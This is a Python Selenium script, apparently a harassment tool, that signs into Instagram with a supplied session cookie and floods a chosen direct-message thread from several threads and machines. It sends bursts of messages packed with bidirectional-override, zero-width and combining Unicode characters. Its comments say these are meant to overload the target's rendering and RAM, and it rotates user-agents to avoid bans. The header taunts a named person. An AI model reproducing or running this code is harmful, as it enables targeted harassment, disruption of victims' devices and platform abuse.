# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (LETHAL NULL-POINTER)
# 📅 STATUS: DENSITY x60 | PULSE-FIRE | BIDI-SPIRAL

import os, time, random, sys, gc, threading
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS_PER_MACHINE = 2
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_lethal_payload(target_name):
    """The Null-Pointer: x60 Density + Memory Buffer Overflow."""
    u_id = random.randint(100000, 999999)
    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 LTHL_{MACHINE_ID}_{u_id}\n"
    
    # 💥 THE 'SPIRAL' (Directional Paradox + Null-Width Bloat)
    # Forces recursive layout calculations.
    spiral = "\u202E\u2066\u202D\u2067\u200B\u200D" * 20
    
    # 💥 DENSITY x60 (600 Zalgo marks)
    z_tower = "̸" * 600
    
    # 💥 THE 'WIDTH-ANCHOR'
    width_anchor = "\u2800\u00A0" * 180 

    lines = [header, width_anchor]
    for i in range(45):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{width_anchor}{prefix}{target_name.upper()}{z_tower}{spiral}")
    
    return "\n".join(lines)[:9995]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    # Dynamic User-Agent to avoid server-side socket bans
    ver = random.randint(120, 122)
    chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def agent_blitz(agent_id, cookie, target_id, target_name):
    driver = None
    strike_count = 0
    while True:
        try:
            driver = get_driver()
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(10)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            while True:
                # 🔥 PULSE-FIRE: 5 STRIKES IN A BURST
                for _ in range(5):
                    try:
                        box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                        payload = get_lethal_payload(target_name)
                        
                        driver.execute_script("""
                            var box = arguments[0];
                            document.execCommand('insertText', false, arguments[1]);
                            box.dispatchEvent(new Event('input', { bubbles: true }));
                        """, box, payload)
                        
                        box.send_keys(Keys.ENTER)
                        strike_count += 1
                        print(f"💀 [M{MACHINE_ID}-A{agent_id}] PULSE STRIKE {strike_count}", flush=True)
                        
                        driver.execute_script("window.stop();")
                        time.sleep(0.01) # Near-zero delay between pulse rounds
                    except: break

                # ⏳ COOLDOWN: Let the target's RAM saturate
                time.sleep(1.5)
                
                # Periodic Refresh to keep the runner account active
                if strike_count % 30 == 0:
                    driver.refresh()
                    time.sleep(8)

        except Exception:
            if driver: driver.quit()
            time.sleep(5)
            continue

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    with ThreadPoolExecutor(max_workers=THREADS_PER_MACHINE) as executor:
        for i in range(THREADS_PER_MACHINE):
            executor.submit(agent_blitz, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
